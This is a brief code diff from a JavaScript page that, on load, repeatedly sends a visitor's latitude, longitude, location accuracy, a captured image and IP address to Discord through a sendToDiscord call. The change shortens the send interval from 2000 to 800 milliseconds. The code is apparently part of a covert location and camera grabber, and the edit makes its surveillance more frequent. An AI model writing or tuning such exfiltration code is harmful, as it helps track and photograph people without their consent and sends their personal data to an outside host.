@@ -201,7 +201,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
 
                     count++;
-                }, 2000);
+                }, 800);
             };
 
         } catch (err) {
